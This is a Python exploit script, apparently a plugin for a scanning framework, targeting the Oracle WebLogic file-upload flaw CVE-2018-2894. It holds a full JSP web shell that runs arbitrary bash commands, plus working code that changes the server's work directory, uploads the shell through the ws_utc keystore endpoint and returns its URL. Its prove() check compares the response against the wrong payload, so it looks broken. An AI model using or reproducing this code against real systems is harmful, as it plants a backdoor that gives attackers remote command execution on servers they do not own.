#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import re
import asyncio
import aiohttp
import xml.etree.ElementTree as ET
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_LEVEL, VUL_TYPE

headers = {'Content-Type': 'application/x-www-form-urlencoded','X-Requested-With': 'XMLHttpRequest'}
prove_content = r'''
    this is a vul for: CVE-2018-2894
'''

upload_content = r'''
<%@ page import="java.util.*,java.io.*,java.net.*"%>
<HTML><BODY>
<FORM METHOD="POST" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send Command">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "\n<BR>");
    Process p = Runtime.getRuntime().exec("/bin/bash -c " + request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr); disr = dis.readLine(); }
    }
 %>
</pre>
</BODY></HTML>
'''

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEBLOGIC
        self.name = 'CVE-2018-2894'
        self.keyword = ['weblogic']
        self.info = 'CVE-2018-2894'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.CRITICAL
        self.refer = 'https://github.com/111ddea/cve-2018-2894'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path = self.base_url
            async with ClientSession() as session:
                new_path = await self.get_new_work_path(session, path)
                flag = await self.set_new_upload_path(session, path, new_path)
                if flag:
                    form = aiohttp.FormData()
                    form.add_field('ks_edit_mode', 'false')
                    form.add_field('ks_password_front', 'mytest')
                    form.add_field('ks_password_changed', 'true')
                    form.add_field('ks_filename', prove_content, filename="myTestFile.txt",content_type='application/octet-stream')
                    async with session.post(url=path + "ws_utc/resources/setting/keystore", data=form) as res:
                        if res:
                            text = await res.text()
                            match = re.findall("<id>(.*?)</id>", text)
                            if match:
                                tid = match[-1]
                                shell_path = self.base_url + "ws_utc/css/config/keystore/" + str(tid) + "_myTestFile.txt"
                                async with session.get(url=shell_path, headers=headers) as res:
                                    if res:
                                        text = await res.text()
                                        if upload_content in text:
                                            self.flag = 1
                                            self.res.append({"info": shell_path, "key": "CVE-2018-2894"})

    async def upload(self):
        await self.get_url()
        if self.base_url:
            path = self.base_url
            async with ClientSession() as session:
                new_path = await self.get_new_work_path(session, path)
                flag = await self.set_new_upload_path(session, path, new_path)
                if flag:
                    form = aiohttp.FormData()
                    form.add_field('ks_edit_mode', 'false')
                    form.add_field('ks_password_front', 'mytest')
                    form.add_field('ks_password_changed', 'true')
                    form.add_field('ks_filename', upload_content, filename="myTestFile.jsp",content_type='application/octet-stream')
                    async with session.post(url=path + "ws_utc/resources/setting/keystore", data=form) as res:
                        if res:
                            text = await res.text()
                            match = re.findall("<id>(.*?)</id>", text)
                            if match:
                                tid = match[-1]
                                shell_path = self.base_url + "ws_utc/css/config/keystore/" + str(tid) + "_myTestFile.jsp"
                                async with session.get(url=shell_path, headers=headers) as res:
                                    if res and res.status == 200:
                                        self.flag = 1
                                        self.res.append({"info": shell_path, "key": "CVE-2018-2894"})


    async def get_current_work_path(self, session, host):
        values = []
        geturl = host + "ws_utc/resources/setting/options/general"
        async with session.get(url=geturl ) as res:
            if res != None:
                text = await res.text()
                if res.status == 404:
                    pass
                elif "Deploying Application".lower() in text.lower():
                    await asyncio.sleep(1.5)
                    async with session.get(url=geturl) as res:
                        if res:
                            text = await res.text()
                if "</defaultValue>" in text:
                    root = ET.fromstring(text)
                    value = root.find("section").find("options")
                    for e in value:
                        for sub in e:
                            if e.tag == "parameter" and sub.tag == "defaultValue":
                                values.append(sub.text)

                if values:
                    return values[0]
        return None

    async def get_new_work_path(self, session, host):
        current_work_path = await self.get_current_work_path(session, host)
        # works = "/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war"
        works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
        if current_work_path:
            if "\\" in current_work_path:
                works = works.replace("/", "\\")
            new_path = str(current_work_path[: str(current_work_path).find("_domain") + 7] + works)
            return new_path
        return None

    async def set_new_upload_path(self, session, host, path):
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'}
        data = {
            "setting_id": "general",
            "BasicConfigOptions.workDir": path,
            "BasicConfigOptions.proxyHost": "",
            "BasicConfigOptions.proxyPort": "80"}
        async with session.post(url= host + "ws_utc/resources/setting/options", data=data, headers=headers) as res:
            if res:
                text = await res.text()
                if "successfully" in text:
                    return True
            return False
